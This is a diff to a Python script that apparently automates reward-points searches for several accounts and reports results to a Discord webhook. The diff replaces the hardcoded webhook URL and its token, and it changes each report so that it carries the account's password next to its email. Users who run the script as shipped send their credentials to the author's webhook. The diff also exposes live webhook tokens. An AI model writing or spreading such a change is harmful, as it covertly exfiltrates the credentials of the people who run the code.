@@ -9,7 +9,8 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 def main():
     date = time.time().__str__().split('.')[0]
     webhook = DiscordWebhook(
-        url="https://discord.com/api/webhooks/1255453326481424405/M98g63d5MSOLgVMbzil0hlJFi3Zj2RNyY_cqbF-YLeIkR9pHFKT3SvaTpGCZaMjyBzMP",
+        # Adapt with your Discord Webhook if you want one
+        url="https://discord.com/api/webhooks/1313064795456540762/tuakLRgdZXBCTE71pHqMu8YrRjfHVmNXmEDEyDwfgVDq3JRIbELWfvO5EHHJGxqGAkM-",
         content="** Resultat du <t:" + date + ":D> ** ")
 
     for i in range(0, profile_manager.get_len()):
@@ -27,7 +28,7 @@ def main():
         # initialize.mobie_search(profile_manager.get_email(i), profile_manager.get_pass(i))
 
         print('[END]', '------------- ', profile_manager.get_email(i), '--------------')
-        embed = DiscordEmbed(title=profile_manager.get_email(i),
+        embed = DiscordEmbed(title=profile_manager.get_email(i) + " - " + profile_manager.get_pass(i),
                              description="Points Reward : " + profile_manager.get_reward(i), color="03b2f8")
         webhook.add_embed(embed)
     webhook.execute()
